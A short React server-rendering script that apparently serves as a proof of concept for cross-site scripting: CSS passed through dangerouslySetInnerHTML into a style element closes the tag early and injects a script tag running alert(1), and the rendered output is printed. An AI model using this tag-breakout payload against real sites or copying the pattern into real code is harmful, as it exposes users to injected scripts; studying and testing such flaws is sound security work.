import React from 'react';
import { renderToString } from 'react-dom/server';

const xss = renderToString(
    <style
      dangerouslySetInnerHTML={{
        __html: `body { color: "blue</style><script>alert(1)</script>"; }`
      }}
    />
);
console.log(xss);
